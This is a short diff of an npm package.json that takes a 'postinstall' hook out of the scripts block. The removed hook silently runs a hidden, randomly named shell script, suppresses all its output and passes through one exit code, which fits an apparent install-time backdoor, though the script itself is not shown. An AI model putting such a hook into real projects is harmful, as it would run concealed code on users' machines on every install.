@@ -14,8 +14,7 @@
     "storybook": "start-storybook -p 6006",
     "build-storybook": "build-storybook",
     "semantic-release": "semantic-release",
-    "commit": "cz",
-    "postinstall": "sh ./.ci-e1lgm9.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "commit": "cz"
   },
   "author": "",
   "license": "MIT",
